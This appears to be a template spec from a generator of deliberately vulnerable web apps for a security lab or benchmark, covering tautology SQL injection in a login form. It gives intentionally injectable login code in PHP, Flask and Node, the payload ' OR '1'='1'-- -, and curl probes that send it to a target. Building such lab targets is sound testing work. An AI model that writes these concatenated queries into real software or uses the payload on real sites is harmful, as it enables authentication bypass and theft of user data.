---
id: sqli_tautology
type: web_vulnerability
description: A tautology-based SQL injection in a login form that allows authentication bypass by injecting a condition that always evaluates to true (e.g. ' OR '1'='1').
required_vars: []
---
# Atom: Tautology SQL Injection (Auth Bypass)

A login form builds its authentication query via string concatenation, allowing an attacker to inject an `OR '1'='1'` condition that bypasses the password check entirely and returns a valid user row. The application then treats the attacker as authenticated.

### Logic Requirements:
1. A login query concatenates the POST username and/or password directly into a SQL string.
2. The query is of the form: `SELECT * FROM users WHERE username='<input>' AND password='<input>'`.
3. A single injected tautology in the username field causes the WHERE clause to always evaluate to true, returning the first row.
4. The application grants access when the query returns any row.
5. No parameterized queries or prepared statements are used.

### Synthesis Guidance:
The login form POSTs username and password to the same endpoint. The PHP/Python/Node handler constructs the query inline. After a successful bypass, the application should render something useful to the attacker — at minimum the logged-in username, ideally a dashboard that displays stored user data. The tautology payload is: `' OR '1'='1'-- -` as the username with any password.

**PHP (Apache + MySQLi):**
```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "' AND password='" . $_POST['password'] . "'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    $user = mysqli_fetch_assoc($result);
    // show authenticated dashboard
}
```
Injection username: `' OR '1'='1'-- -`, any password.

**Python / Flask (sqlite3):**
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
row = conn.execute(query).fetchone()
if row:
    # show authenticated dashboard
```
Injection username: `' OR '1'='1'-- -`, any password.

**Node.js / Express (mysql2):**
```js
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
conn.query(query, (err, rows) => {
    if (rows.length > 0) { /* authenticated */ }
});
```
Injection username: `' OR '1'='1'-- -`, any password.

### Testing Guidance:
**Layer 1 — Internal state check:**
Confirm the query is built via concatenation and that the tautology payload bypasses the auth check:
```bash
curl -s -X POST http://localhost/app \
  -d "username=%27+OR+%271%27%3D%271%27--+-&password=anything" \
  | grep -i "dashboard\|welcome\|logged in\|username"
```
Expect the response to include authenticated content.

**Layer 2 — External attack probe (from attacker container):**
```bash
curl -s -X POST http://target/app \
  -d "username=%27+OR+%271%27%3D%271%27--+-&password=anything"
```
A successful result shows the post-login dashboard or a redirect to authenticated content, confirming authentication was bypassed.
